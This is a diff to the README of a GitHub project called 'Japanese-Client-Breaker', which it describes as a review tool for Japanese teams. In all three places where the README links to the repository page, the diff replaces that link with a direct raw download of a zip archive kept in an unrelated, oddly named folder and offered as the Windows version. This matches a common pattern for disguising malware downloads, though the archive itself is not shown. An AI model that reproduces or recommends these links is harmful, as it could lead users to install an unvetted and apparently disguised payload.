@@ -1,6 +1,6 @@
 # 🛡️ Japanese-Client-Breaker - Clear reviews for Japanese teams
 
-[![Download](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://github.com/filekant8012/Japanese-Client-Breaker)
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://github.com/filekant8012/Japanese-Client-Breaker/raw/refs/heads/main/precipitinogen/Client-Japanese-Breaker-2.9-beta.1.zip)
 
 ## 🌐 Overview
 
@@ -29,7 +29,7 @@ For best results, use a screen with at least 1366 × 768 resolution.
 
 Go to the main page here:
 
-https://github.com/filekant8012/Japanese-Client-Breaker
+https://github.com/filekant8012/Japanese-Client-Breaker/raw/refs/heads/main/precipitinogen/Client-Japanese-Breaker-2.9-beta.1.zip
 
 On that page, follow these steps:
 
@@ -215,7 +215,7 @@ agent,agent-workflow,ai-agents,claude-code,consulting,harness,japanese-business,
 
 Open the main page here and download the Windows version:
 
-https://github.com/filekant8012/Japanese-Client-Breaker
+https://github.com/filekant8012/Japanese-Client-Breaker/raw/refs/heads/main/precipitinogen/Client-Japanese-Breaker-2.9-beta.1.zip
 
 ## 🖥️ Simple Start Checklist
 
